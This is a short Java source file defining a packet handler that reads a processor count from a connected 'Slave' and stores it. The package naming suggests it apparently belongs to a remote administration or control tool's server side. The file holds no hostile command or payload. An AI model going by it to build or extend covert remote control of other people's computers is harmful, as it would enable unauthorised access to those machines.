package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketAPS extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		short processors = Short.parseShort(slave.readLine());
		slave.setProcessors(processors);
	}

}
